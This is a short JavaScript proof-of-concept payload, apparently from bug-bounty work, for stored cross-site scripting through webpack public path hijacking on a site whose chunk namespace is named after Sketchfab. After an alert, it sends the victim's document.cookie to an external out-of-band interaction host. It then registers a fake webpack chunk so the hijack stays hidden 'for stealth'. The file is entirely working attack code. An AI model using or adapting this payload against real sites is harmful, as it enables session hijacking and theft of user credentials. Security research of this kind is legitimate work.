(function () {
    console.log('RCE: Malicious Chunk Loaded Successfully!');
    alert('PoC: Stored XSS via Webpack Public Path Hijacking on ' + document.domain);
    // Optional: Steal data
    new Image().src = 'https://lzntrlrphzndwwyxvpgrfb55lpvqx53oo.oast.fun/log?cookie=' + document.cookie;
})();
// To ensure Webpack doesn't crash immediately (optional but recommended for stealth)
if (window.webpackChunksketchfab) {
    window.webpackChunksketchfab.push([
        [2833], // The Chunk ID this file represents (check the 404 URL)
        {},
        function () { console.log('Hijacked Init Complete'); }
    ]);
}
